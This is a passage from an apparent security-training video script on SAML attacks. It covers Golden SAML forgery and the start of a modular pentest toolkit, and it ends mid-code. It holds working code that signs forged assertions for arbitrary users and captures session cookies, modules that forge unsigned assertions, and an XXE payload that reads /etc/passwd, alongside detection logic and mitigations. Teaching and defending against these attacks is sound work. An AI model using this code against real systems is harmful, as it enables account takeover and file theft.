**[VISUAL: Layered defense diagram]**

**NARRATOR:**
"Defense in depth prevents chaining. Each vulnerability needs a specific fix. Session fixation: regenerate sessions. XSW: read from verified element. Comment injection: reject comments in NameID. RelayState: allowlist validation."

"But the principle is bigger: assume one defense might fail. Layer multiple controls. Use python3-saml with strict mode. Add defusedxml. Implement replay protection. Harden sessions. Each layer makes chaining exponentially harder."

"Next episode: Golden SAML — the most advanced persistence attack."

**[VISUAL: Preview showing certificate generation and forged SAML assertions]**

---

## Episode 08: Golden SAML Attack Simulation

**Duration:** 13 minutes
**Level:** L3 - Enterprise Architecture
**Learning Objective:** Understand and simulate Golden SAML attacks by generating signing certificates and forging assertions to authenticate as any user.

---

### SCENE 1: The Ultimate Persistence (0:00 - 2:00)

**[VISUAL: Dark screen with timeline appearing: "Day 0: IdP Compromised" → "Day 30: Passwords Reset" → "Day 60: MFA Re-enrolled" → "Day 90: Attacker Still Has Access"]**

**NARRATOR:**
"This is the nightmare scenario for enterprise security. An attacker compromises your Identity Provider and steals one thing: the SAML token-signing private key. With that key, they can forge SAML assertions for any user, with any roles, at any time."

"You reset every password. You rotate MFA tokens. You re-enroll all users. And the attacker still has full access. Because they're not logging in through the IdP anymore. They're forging assertions directly. No authentication. No audit logs at the IdP. No way to detect it without correlating SP authentication events with IdP audit logs."

"This is Golden SAML. It's how nation-state attackers maintain persistent access to enterprise environments. And I'm going to show you exactly how it works."

**[VISUAL: Disclaimer overlay]**

"Disclaimer: This is for educational purposes in authorized lab environments only. Unauthorized use of these techniques is illegal and unethical."

---

### SCENE 2: Understanding the Attack Prerequisites (2:00 - 4:00)

**[VISUAL: Attack requirements checklist]**

**NARRATOR:**
"Golden SAML requires one critical artifact: the IdP's SAML token-signing private key. How does an attacker get this?"

**[VISUAL: Threat scenarios]**

```
Golden SAML Prerequisites:

1. Compromise Methods:
   ✓ Direct IdP server breach (ADFS, Okta, custom IdP)
   ✓ Database access where keys are stored
   ✓ Backup file theft
   ✓ Memory dump from IdP process
   ✓ Configuration file access
   ✓ Insider threat

2. Key Storage Locations:
   - ADFS: C:\ProgramData\Microsoft\ADFS\*
   - Custom IdP: Database, filesystem, HSM
   - Okta: HSM-backed (harder to extract)
   - Azure AD: Cloud HSM (requires different attack)

3. What the Attacker Needs:
   ✓ Private key (PEM/DER format)
   ✓ Certificate (public key) - often already public in metadata
   ✓ SP entity ID and ACS URL
   ✓ Understanding of expected assertion format
```

**[VISUAL: Lab environment setup]**

**NARRATOR:**
"In our lab, we simulate a compromised IdP by exposing the private key through an endpoint. In real attacks, extracting this key is the hardest part. But once obtained, forging assertions is straightforward."

---

### SCENE 3: Forging Golden SAML Assertions (4:00 - 8:00)

**[VISUAL: Code editor with new script `golden_saml_forge.py`]**

**NARRATOR:**
"Let's forge a Golden SAML assertion. We'll generate our own signing certificate, sign assertions, and authenticate as anyone."

```python
#!/usr/bin/env python3
"""
Golden SAML Attack Simulation - Episode 08 Demo
Requires: Compromised IdP signing key
Target: Any SAML SP trusting the compromised IdP
"""

import base64
from datetime import datetime, timedelta
from lxml import etree
from signxml import XMLSigner
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes

class GoldenSAMLForge:
    """Forge SAML assertions with compromised signing key"""

    def __init__(self, idp_private_key_pem=None, idp_cert_pem=None):
        """
        Initialize with compromised key material.
        If not provided, generate self-signed cert (for demo only).
        """
        if idp_private_key_pem and idp_cert_pem:
            # Use stolen IdP key
            self.private_key = serialization.load_pem_private_key(
                idp_private_key_pem.encode(),
                password=None,
                backend=default_backend()
            )
            self.certificate = idp_cert_pem
        else:
            # Generate self-signed cert for lab demo
            self._generate_self_signed_cert()

    def _generate_self_signed_cert(self):
        """Generate self-signed certificate (lab only)"""
        print("[*] Generating self-signed certificate (IdP simulation)...")

        # Generate private key
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )

        # Generate certificate
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "Compromised IdP"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Evil Corp"),
        ])

        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            self.private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).sign(self.private_key, hashes.SHA256(), default_backend())

        self.certificate = cert.public_bytes(serialization.Encoding.PEM).decode()
        print("[+] Certificate generated")

    def forge_assertion(
        self,
        target_user="admin@company.com",
        roles=["superadmin"],
        sp_entity_id="http://localhost:5001/metadata",
        sp_acs_url="http://localhost:5001/saml/acs-golden",
        validity_minutes=30
    ):
        """Forge a signed SAML assertion for any user"""

        print(f"\n[*] Forging Golden SAML assertion:")
        print(f"    Target user: {target_user}")
        print(f"    Roles: {', '.join(roles)}")
        print(f"    SP ACS: {sp_acs_url}")

        # Time calculations
        now = datetime.utcnow()
        not_before = now - timedelta(minutes=5)
        not_after = now + timedelta(minutes=validity_minutes)

        issue_instant = now.strftime("%Y-%m-%dT%H:%M:%SZ")
        not_before_str = not_before.strftime("%Y-%m-%dT%H:%M:%SZ")
        not_after_str = not_after.strftime("%Y-%m-%dT%H:%M:%SZ")

        # Build role attributes
        role_attrs = ""
        for role in roles:
            role_attrs += f"""
            <saml:Attribute Name="role">
                <saml:AttributeValue>{role}</saml:AttributeValue>
            </saml:Attribute>"""

        # Craft unsigned assertion
        assertion_xml = f"""<saml:Assertion
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_golden_assertion_{now.timestamp()}"
    Version="2.0"
    IssueInstant="{issue_instant}">

    <saml:Issuer>https://compromised-idp.example.com</saml:Issuer>

    <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
            {target_user}
        </saml:NameID>
        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
            <saml:SubjectConfirmationData
                NotOnOrAfter="{not_after_str}"
                Recipient="{sp_acs_url}"/>
        </saml:SubjectConfirmation>
    </saml:Subject>

    <saml:Conditions NotBefore="{not_before_str}" NotOnOrAfter="{not_after_str}">
        <saml:AudienceRestriction>
            <saml:Audience>{sp_entity_id}</saml:Audience>
        </saml:AudienceRestriction>
    </saml:Conditions>

    <saml:AuthnStatement AuthnInstant="{issue_instant}" SessionIndex="_golden_session_{now.timestamp()}">
        <saml:AuthnContext>
            <saml:AuthnContextClassRef>
                urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
            </saml:AuthnContextClassRef>
        </saml:AuthnContext>
    </saml:AuthnStatement>

    <saml:AttributeStatement>{role_attrs}
    </saml:AttributeStatement>
</saml:Assertion>"""

        # Parse and sign
        assertion_elem = etree.fromstring(assertion_xml.encode())

        print("[*] Signing assertion with compromised private key...")

        # Sign the assertion
        signer = XMLSigner(
            method=signxml.methods.enveloped,
            signature_algorithm="rsa-sha256",
            digest_algorithm="sha256"
        )

        signed_assertion = signer.sign(
            assertion_elem,
            key=self.private_key,
            cert=self.certificate
        )

        # Wrap in Response
        response_xml = f"""<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_golden_response_{now.timestamp()}"
    Version="2.0"
    IssueInstant="{issue_instant}"
    Destination="{sp_acs_url}">

    <saml:Issuer>https://compromised-idp.example.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>

    {etree.tostring(signed_assertion, encoding='unicode')}
</samlp:Response>"""

        print("[+] Golden SAML assertion forged successfully")
        return base64.b64encode(response_xml.encode()).decode()

    def authenticate_as_anyone(self, target_user, roles, sp_acs_url):
        """Complete attack: forge and submit"""
        import requests

        saml_b64 = self.forge_assertion(
            target_user=target_user,
            roles=roles,
            sp_acs_url=sp_acs_url
        )

        print(f"\n[*] Submitting to {sp_acs_url}...")
        response = requests.post(
            sp_acs_url,
            data={'SAMLResponse': saml_b64},
            allow_redirects=False
        )

        if response.status_code == 302:
            print(f"[+] SUCCESS! Authenticated as {target_user}")
            print(f"[+] Session cookie: {response.cookies.get('session')}")
            return response.cookies.get('session')
        else:
            print(f"[!] Failed: {response.status_code} - {response.text}")
            return None


if __name__ == "__main__":
    print("="*70)
    print("Golden SAML Attack Simulation")
    print("="*70)

    # Option 1: Use compromised key from lab endpoint
    import requests
    try:
        idp_metadata = requests.get('http://localhost:5001/idp-metadata').json()
        private_key_pem = idp_metadata['private_key']
        cert_pem = idp_metadata['certificate']
        print("[+] Retrieved compromised IdP key from lab endpoint")
        forger = GoldenSAMLForge(private_key_pem, cert_pem)
    except:
        print("[!] Could not retrieve IdP key, using self-signed (demo only)")
        forger = GoldenSAMLForge()

    # Forge assertions for different users
    print("\n" + "="*70)
    print("Scenario 1: Authenticate as CEO")
    print("="*70)
    forger.authenticate_as_anyone(
        target_user="ceo@company.com",
        roles=["ceo", "board_member", "superadmin"],
        sp_acs_url="http://localhost:5001/saml/acs-golden"
    )

    print("\n" + "="*70)
    print("Scenario 2: Authenticate as Service Account")
    print("="*70)
    forger.authenticate_as_anyone(
        target_user="svc_backup@company.com",
        roles=["backup_admin", "read_all"],
        sp_acs_url="http://localhost:5001/saml/acs-golden"
    )

    print("\n[*] Golden SAML attack complete")
    print("[*] Attacker can now authenticate as ANY user without IdP interaction")
```

**[VISUAL: Run the script. Show successful authentication as CEO and service accounts.]**

**NARRATOR:**
"That's Golden SAML. Forge the assertion, sign it with the stolen key, submit to the SP. The signature is valid — it's signed with the real IdP key. The SP accepts it. No password. No MFA. No IdP audit log entry."

---

### SCENE 4: Detection Indicators (8:00 - 10:30)

**[VISUAL: Code showing detection logic]**

**NARRATOR:**
"Detection is possible but requires correlation between SP and IdP logs. Here's what to look for."

```python
import requests
from datetime import datetime, timedelta

def detect_golden_saml_indicators(saml_response_xml, authenticated_user, idp_audit_api_url):
    """
    Detect Golden SAML by cross-referencing SP auth with IdP logs
    """
    indicators = []

    # Extract assertion metadata
    from lxml import etree
    root = etree.fromstring(saml_response_xml)
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}

    assertion = root.find('.//saml:Assertion', ns)
    issue_instant = assertion.get('IssueInstant')
    issue_time = datetime.fromisoformat(issue_instant.replace('Z', '+00:00'))

    # INDICATOR 1: Authentication outside business hours
    if issue_time.hour < 6 or issue_time.hour > 20:
        indicators.append({
            'severity': 'medium',
            'type': 'unusual_time',
            'detail': f'Assertion issued at {issue_time} (outside 6am-8pm)'
        })

    # INDICATOR 2: Long validity window (Golden SAML often uses longer windows)
    conditions = assertion.find('.//saml:Conditions', ns)
    not_before = datetime.fromisoformat(conditions.get('NotBefore').replace('Z', '+00:00'))
    not_after = datetime.fromisoformat(conditions.get('NotOnOrAfter').replace('Z', '+00:00'))
    validity_minutes = (not_after - not_before).total_seconds() / 60

    if validity_minutes > 10:  # Normal is 5 minutes
        indicators.append({
            'severity': 'high',
            'type': 'long_validity',
            'detail': f'Assertion valid for {validity_minutes} minutes (normal: 5)'
        })

    # INDICATOR 3: Missing IdP login event (STRONGEST SIGNAL)
    try:
        idp_logs = requests.get(
            f"{idp_audit_api_url}/auth_events",
            params={
                'user': authenticated_user,
                'start_time': (issue_time - timedelta(minutes=1)).isoformat(),
                'end_time': (issue_time + timedelta(minutes=1)).isoformat()
            }
        ).json()

        if len(idp_logs) == 0:
            indicators.append({
                'severity': 'critical',
                'type': 'missing_idp_event',
                'detail': f'No IdP authentication event for {authenticated_user} at {issue_time}'
            })
    except Exception as e:
        indicators.append({
            'severity': 'warning',
            'type': 'idp_check_failed',
            'detail': f'Could not verify with IdP: {e}'
        })

    # INDICATOR 4: Unusual role escalation
    roles = [attr.text for attr in assertion.findall(
        ".//saml:Attribute[@Name='role']/saml:AttributeValue", ns
    )]
    if 'superadmin' in roles or 'ceo' in roles:
        # Check if user normally has these roles
        normal_roles = get_user_normal_roles(authenticated_user)
        if not set(roles).issubset(set(normal_roles)):
            indicators.append({
                'severity': 'high',
                'type': 'role_escalation',
                'detail': f'User has roles {roles}, normally has {normal_roles}'
            })

    # INDICATOR 5: Assertion ID pattern (sophisticated detection)
    assertion_id = assertion.get('ID')
    if '_golden_' in assertion_id or not assertion_id.startswith('_'):
        indicators.append({
            'severity': 'medium',
            'type': 'unusual_assertion_id',
            'detail': f'Assertion ID pattern unusual: {assertion_id}'
        })

    return indicators


def alert_security_team(indicators):
    """Alert SOC if Golden SAML detected"""
    critical = [i for i in indicators if i['severity'] == 'critical']

    if critical:
        print("[!] CRITICAL: Possible Golden SAML attack detected!")
        for indicator in indicators:
            print(f"    [{indicator['severity'].upper()}] {indicator['type']}: {indicator['detail']}")

        # Send to SIEM
        # send_to_siem(indicators)

        # Trigger incident response
        # create_incident("Golden SAML suspected", indicators)
```

**[VISUAL: Table showing detection signals]**

```
Golden SAML Detection Signals:

CRITICAL:
✓ SP auth event with NO corresponding IdP login
✓ Multiple SPs authenticating same user simultaneously

HIGH:
✓ Long assertion validity window (>10 min)
✓ Unexpected role escalation
✓ Authentication for disabled/non-existent users

MEDIUM:
✓ Authentication outside business hours
✓ Unusual assertion ID patterns
✓ Geographic impossibility (user in 2 locations)
```

---

### SCENE 5: Mitigation and Prevention (10:30 - 13:00)

**[VISUAL: Defense checklist]**

**NARRATOR:**
"Golden SAML is devastating because it's post-compromise persistence. The mitigation is layered."

```
Golden SAML Defense Strategy:

PREVENTION (Stop key theft):
✓ Store signing keys in HSM (Hardware Security Module)
✓ Limit access to IdP servers and key storage
✓ Monitor key file access
✓ Regular key rotation (annual minimum)
✓ Principle of least privilege for IdP admins

DETECTION (Find ongoing attacks):
✓ Cross-reference SP auth events with IdP audit logs
✓ Alert on missing IdP authentication events
✓ Monitor for unusual assertion patterns
✓ Behavioral analytics for role escalation
✓ Geographic impossibility detection

RESPONSE (Recover from compromise):
✓ Immediate certificate rotation
✓ Force re-authentication of all sessions
✓ Forensic analysis of IdP breach
✓ Review all authentications during compromise window
✓ Notify affected users and services
```

**[VISUAL: Code showing automated key rotation]**

```python
class SAMLCertificateRotation:
    """Automate SAML signing certificate rotation"""

    def rotate_idp_certificate(self):
        """
        Generate new signing certificate and update all SPs
        """
        print("[*] Generating new signing key pair...")
        new_private_key, new_cert = self._generate_new_keypair()

        print("[*] Updating IdP configuration...")
        self._update_idp_config(new_private_key, new_cert)

        print("[*] Publishing updated metadata...")
        self._publish_metadata(new_cert)

        print("[*] Notifying all SPs to update...")
        for sp in self.get_registered_sps():
            self._notify_sp_update(sp, new_cert)

        print("[*] Revoking old certificate (grace period: 24 hours)...")
        self._schedule_revocation(old_cert_fingerprint, hours=24)

        print("[+] Certificate rotation complete")

    def emergency_rotation_after_breach(self):
        """
        Emergency rotation with immediate revocation
        """
        print("[!] EMERGENCY ROTATION - Suspected key compromise")

        # Generate and deploy new cert
        new_private_key, new_cert = self._generate_new_keypair()
        self._update_idp_config(new_private_key, new_cert)
        self._publish_metadata(new_cert)

        # IMMEDIATE revocation - no grace period
        self._revoke_old_certificate_immediately()

        # Force session termination
        print("[*] Terminating all active SAML sessions...")
        self._terminate_all_sessions()

        # Alert
        print("[!] All users must re-authenticate")
        self._send_incident_notifications()
```

**NARRATOR:**
"The strongest defense is preventing key theft with HSM storage. But assume breach — implement detection through log correlation. And have a tested incident response plan that includes immediate certificate rotation."

"Golden SAML is the ultimate SAML attack. Next episode: building a comprehensive SAML testing toolkit."

**[VISUAL: Preview showing modular Python testing framework]**

---

## Episode 09: Building a SAML Testing Toolkit

**Duration:** 12 minutes
**Level:** L3 - Enterprise Architecture
**Learning Objective:** Design and implement a modular Python framework for automated SAML security testing across all vulnerability categories.

---

### SCENE 1: From Manual to Automated (0:00 - 1:30)

**[VISUAL: Split screen showing manual curl commands on left, automated test suite running on right]**

**NARRATOR:**
"We've exploited SAML vulnerabilities one by one. Manual decoding. Custom scripts for each attack. Copy-pasting Base64 blobs. It works for learning. But professional penetration testing requires automation."

"This episode, we build a comprehensive SAML testing toolkit. Modular architecture. Automated vulnerability scanning. Detailed reporting. Extensible for new attack techniques. By the end, you'll have a framework that tests all ten vulnerability categories we've covered."

**[VISUAL: Framework architecture diagram appearing]**

---

### SCENE 2: Framework Architecture (1:30 - 3:30)

**[VISUAL: Code editor showing project structure]**

**NARRATOR:**
"Let's design the architecture. Object-oriented. Each vulnerability is a test module. Shared utilities for SAML manipulation. Reporter for findings."

```
saml_pentest_toolkit/
│
├── core/
│   ├── __init__.py
│   ├── saml_manipulator.py      # SAML encoding/decoding/parsing
│   ├── http_client.py            # Request handling with session mgmt
│   └── signature_utils.py        # Signing and verification utilities
│
├── attacks/
│   ├── __init__.py
│   ├── base_attack.py            # Abstract base class
│   ├── nosig_attack.py           # Missing signature validation
│   ├── xxe_attack.py             # XXE injection
│   ├── replay_attack.py          # Replay attacks
│   ├── xsw_attack.py             # XML Signature Wrapping
│   ├── comment_injection.py      # Comment injection
│   ├── audience_bypass.py        # Audience/strict mode bypass
│   ├── session_fixation.py       # Session management attacks
│   ├── relay_redirect.py         # RelayState open redirect
│   └── golden_saml.py            # Golden SAML simulation
│
├── scanners/
│   ├── __init__.py
│   └── automated_scanner.py      # Run all attack modules
│
├── reporting/
│   ├── __init__.py
│   ├── reporter.py               # Generate findings reports
│   └── templates/                # Report templates
│
├── config/
│   ├── targets.yaml              # Target configuration
│   └── attack_config.yaml        # Attack parameters
│
└── saml_pentest.py               # Main CLI tool
```

**[VISUAL: Class hierarchy diagram]**

**NARRATOR:**
"The base attack class defines the interface. Each attack module implements `check_vulnerability()` and `exploit()`. The scanner orchestrates execution. The reporter consolidates findings."

---

### SCENE 3: Core SAML Manipulator (3:30 - 5:30)

**[VISUAL: Code editor showing saml_manipulator.py]**

**NARRATOR:**
"Start with the foundation — SAML manipulation utilities."

```python
# core/saml_manipulator.py
"""
SAML encoding, decoding, parsing, and manipulation utilities
"""

import base64
from lxml import etree
import defusedxml.lxml as safe_lxml
from datetime import datetime, timedelta
from typing import Optional, Dict, List

class SAMLManipulator:
    """Utilities for SAML response manipulation"""

    NAMESPACES = {
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
        'ds': 'http://www.w3.org/2000/09/xmldsig#'
    }

    @staticmethod
    def decode(saml_b64: str, safe: bool = True) -> etree.Element:
        """Decode Base64 SAML response"""
        xml_bytes = base64.b64decode(saml_b64)

        if safe:
            return safe_lxml.fromstring(xml_bytes)
        else:
            return etree.fromstring(xml_bytes)

    @staticmethod
    def encode(saml_elem: etree.Element) -> str:
        """Encode SAML to Base64"""
        xml_bytes = etree.tostring(saml_elem, encoding='utf-8')
        return base64.b64encode(xml_bytes).decode()

    @staticmethod
    def pretty_print(saml_elem: etree.Element) -> str:
        """Pretty-print SAML XML"""
        return etree.tostring(saml_elem, pretty_print=True, encoding='unicode')

    @staticmethod
    def extract_nameid(saml_elem: etree.Element, use_itertext: bool = False) -> Optional[str]:
        """Extract NameID from SAML response"""
        name_id_elem = saml_elem.find('.//saml:NameID', SAMLManipulator.NAMESPACES)

        if name_id_elem is None:
            return None

        if use_itertext:
            return ''.join(name_id_elem.itertext())
        else:
            return name_id_elem.text

    @staticmethod
    def extract_roles(saml_elem: etree.Element) -> List[str]:
        """Extract role attributes"""
        roles = []
        for attr in saml_elem.findall(
            ".//saml:Attribute[@Name='role']/saml:AttributeValue",
            SAMLManipulator.NAMESPACES
        ):
            if attr.text:
                roles.append(attr.text)
        return roles

    @staticmethod
    def get_response_id(saml_elem: etree.Element) -> Optional[str]:
        """Get Response ID"""
        return saml_elem.get('ID')

    @staticmethod
    def get_assertion_id(saml_elem: etree.Element) -> Optional[str]:
        """Get Assertion ID"""
        assertion = saml_elem.find('.//saml:Assertion', SAMLManipulator.NAMESPACES)
        return assertion.get('ID') if assertion is not None else None

    @staticmethod
    def has_signature(saml_elem: etree.Element) -> bool:
        """Check if SAML contains a signature"""
        sig = saml_elem.find('.//ds:Signature', SAMLManipulator.NAMESPACES)
        return sig is not None

    @staticmethod
    def remove_signature(saml_elem: etree.Element) -> etree.Element:
        """Remove signature from SAML (for testing unsigned)"""
        for sig in saml_elem.findall('.//ds:Signature', SAMLManipulator.NAMESPACES):
            sig.getparent().remove(sig)
        return saml_elem

    @staticmethod
    def forge_minimal_assertion(
        name_id: str,
        roles: List[str],
        recipient: str,
        validity_minutes: int = 30
    ) -> str:
        """Forge a minimal unsigned SAML assertion"""

        now = datetime.utcnow()
        not_before = (now - timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
        not_after = (now + timedelta(minutes=validity_minutes)).strftime("%Y-%m-%dT%H:%M:%SZ")
        issue_instant = now.strftime("%Y-%m-%dT%H:%M:%SZ")

        role_attrs = ""
        for role in roles:
            role_attrs += f"""
            <saml:Attribute Name="role">
                <saml:AttributeValue>{role}</saml:AttributeValue>
            </saml:Attribute>"""

        saml_xml = f"""<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_forged_{now.timestamp()}"
    Version="2.0"
    IssueInstant="{issue_instant}"
    Destination="{recipient}">

    <saml:Issuer>https://attacker-idp.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>

    <saml:Assertion ID="_assertion_{now.timestamp()}" Version="2.0" IssueInstant="{issue_instant}">
        <saml:Issuer>https://attacker-idp.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID>{name_id}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData NotOnOrAfter="{not_after}" Recipient="{recipient}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{not_before}" NotOnOrAfter="{not_after}">
            <saml:AudienceRestriction>
                <saml:Audience>{recipient}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AttributeStatement>{role_attrs}
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>"""

        return base64.b64encode(saml_xml.encode()).decode()
```

**[VISUAL: Demonstrate using the manipulator in Python REPL]**

```python
>>> from core.saml_manipulator import SAMLManipulator
>>>
>>> # Forge an assertion
>>> forged = SAMLManipulator.forge_minimal_assertion(
...     name_id="attacker@evil.com",
...     roles=["admin"],
...     recipient="http://target.com/acs"
... )
>>> print(forged[:50])
PHNhbWxwOlJlc3BvbnNlCiAgICB4bWxuczpzYW1scD0idXJuOm9h
```

---

### SCENE 4: Base Attack Module (5:30 - 7:00)

**[VISUAL: Code editor showing base_attack.py]**

**NARRATOR:**
"Now the base class that all attack modules inherit from."

```python
# attacks/base_attack.py
"""
Abstract base class for SAML attack modules
"""

from abc import ABC, abstractmethod
from typing import Dict, Optional
from dataclasses import dataclass
from enum import Enum

class Severity(Enum):
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class Finding:
    """Represents a security finding"""
    vulnerability: str
    severity: Severity
    description: str
    evidence: str
    remediation: str
    cwe: Optional[str] = None
    cvss: Optional[float] = None

class BaseAttack(ABC):
    """Base class for all SAML attack modules"""

    def __init__(self, target_url: str, config: Dict):
        self.target_url = target_url
        self.config = config
        self.findings = []

    @abstractmethod
    def check_vulnerability(self) -> bool:
        """
        Check if the target is vulnerable to this attack.
        Returns True if vulnerable, False otherwise.
        """
        pass

    @abstractmethod
    def exploit(self) -> Optional[Dict]:
        """
        Attempt to exploit the vulnerability.
        Returns exploitation results or None if failed.
        """
        pass

    @abstractmethod
    def get_attack_name(self) -> str:
        """Return the name of this attack"""
        pass

    def report_finding(self, finding: Finding):
        """Add a finding to the results"""
        self.findings.append(finding)

    def get_findings(self):
        """Get all findings from this attack"""
        return self.findings
```

---

### SCENE 5: Implementing Attack Modules (7:00 - 9:30)

**[VISUAL: Code editor showing specific attack implementations]**

**NARRATOR:**
"Let's implement a couple attack modules using this framework."

```python
# attacks/nosig_attack.py
"""
Missing Signature Validation Attack Module
"""

import requests
from .base_attack import BaseAttack, Finding, Severity
from core.saml_manipulator import SAMLManipulator

class MissingSignatureAttack(BaseAttack):
    """Test for missing SAML signature validation"""

    def get_attack_name(self) -> str:
        return "Missing Signature Validation"

    def check_vulnerability(self) -> bool:
        """Check if target accepts unsigned assertions"""

        print(f"[*] Testing {self.target_url} for missing signature validation...")

        # Forge unsigned assertion
        forged_saml = SAMLManipulator.forge_minimal_assertion(
            name_id=self.config.get('test_user', 'pentest@example.com'),
            roles=['admin'],
            recipient=self.target_url
        )

        # Submit to target
        try:
            response = requests.post(
                self.target_url,
                data={'SAMLResponse': forged_saml},
                allow_redirects=False,
                timeout=10
            )

            # Check if accepted (302 redirect or 200 with success indicators)
            if response.status_code in [200, 302]:
                # Verify we're actually authenticated
                if 'session' in response.cookies or 'Set-Cookie' in response.headers:
                    print(f"[+] VULNERABLE: Accepts unsigned SAML assertions")

                    self.report_finding(Finding(
                        vulnerability="Missing SAML Signature Validation",
                        severity=Severity.CRITICAL,
                        description=(
                            "The application accepts SAML assertions without validating "
                            "the digital signature. An attacker can forge assertions claiming "
                            "any identity with any privileges."
                        ),
                        evidence=f"Forged unsigned assertion accepted at {self.target_url}",
                        remediation=(
                            "Implement signature validation using python3-saml or equivalent "
                            "library. Set wantAssertionsSigned=True and strict=True."
                        ),
                        cwe="CWE-347",
                        cvss=9.8
                    ))
                    return True

            print(f"[-] Not vulnerable: Unsigned assertion rejected")
            return False

        except Exception as e:
            print(f"[!] Error testing: {e}")
            return False

    def exploit(self) -> Optional[Dict]:
        """Exploit missing signature validation"""

        target_user = self.config.get('exploit_user', 'admin@company.com')
        target_roles = self.config.get('exploit_roles', ['superadmin'])

        print(f"[*] Exploiting: Forging assertion for {target_user} with roles {target_roles}")

        forged_saml = SAMLManipulator.forge_minimal_assertion(
            name_id=target_user,
            roles=target_roles,
            recipient=self.target_url
        )

        response = requests.post(
            self.target_url,
            data={'SAMLResponse': forged_saml},
            allow_redirects=False
        )

        if response.status_code in [200, 302]:
            return {
                'success': True,
                'user': target_user,
                'roles': target_roles,
                'session_cookie': response.cookies.get('session'),
                'redirect_to': response.headers.get('Location')
            }

        return None
```

```python
# attacks/xxe_attack.py
"""
XXE Injection Attack Module
"""

import base64
import requests
from .base_attack import BaseAttack, Finding, Severity

class XXEAttack(BaseAttack):
    """Test for XXE vulnerabilities in SAML parser"""

    def get_attack_name(self) -> str:
        return "XXE Injection"

    def check_vulnerability(self) -> bool:
        """Check if target is vulnerable to XXE"""

        print(f"[*] Testing {self.target_url} for XXE vulnerability...")

        # Craft XXE payload to read /etc/hostname (safer than /etc/passwd for testing)
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Assertion>
        <saml:Subject>
            <saml:NameID>&xxe;</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>"""

        saml_b64 = base64.b64encode(xxe_payload.encode()).decode()

        try:
            response = requests.post(
                self.target_url,
                data={'SAMLResponse': saml_b64},
                timeout=10
            )

            # Check for file contents in response or error messages
            # /etc/hostname typically contains the system hostname
            if len(response.text) > 10 and any(c.isalnum() for c in response.text):
                # Might have file contents
                print(f"[+] VULNERABLE: XXE injection successful")

                self.report_finding(Finding(
                    vulnerability="XML External Entity (XXE) Injection",
                    severity=Severity.HIGH,
                    description=(
                        "The SAML XML parser resolves external entities, allowing "
                        "attackers to read server files, perform SSRF, or cause DoS."
                    ),
                    evidence=f"XXE payload triggered at {self.target_url}",
                    remediation=(
                        "Use defusedxml instead of lxml for parsing. "
                        "Disable DTD processing and external entity resolution."
                    ),
                    cwe="CWE-611",
                    cvss=8.6
                ))
                return True

            return False

        except Exception as e:
            print(f"[!] Error testing XXE: {e}")
            return False

    def exploit(self) -> Optional[Dict]:
        """Exploit XXE to read files"""

        target_file = self.config.get('xxe_target_file', '/etc/passwd')

        xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target_file}">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Assertion>
        <saml:Subject>
            <saml:NameID>&xxe;</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>"""

        saml_b64 = base64.b64encode(xxe_payload.encode()).decode()

        response = requests.post(self.target_url, data={'SAMLResponse': saml_b64})

        return {
            'success': True,
            'file_read': target_file,
            'response_snippet': response.text[:500]
        }
```

**NARRATOR:**
"Each module follows the same pattern: check for the vulnerability, report findings with severity and remediation, and provide an exploit method. This makes the framework extensible — adding new attack types is just implementing the base class interface."

---

### SCENE 6: Automated Scanner (9:30 - 11:00)

**[VISUAL: Code editor showing automated_scanner.py]**

**NARRATOR:**
"Now the scanner that orchestrates all attack modules."

```python
# scanners/automated_scanner.py
"""
Automated SAML Security Scanner
"""

from typing import List, Dict
from attacks.base_attack import BaseAttack
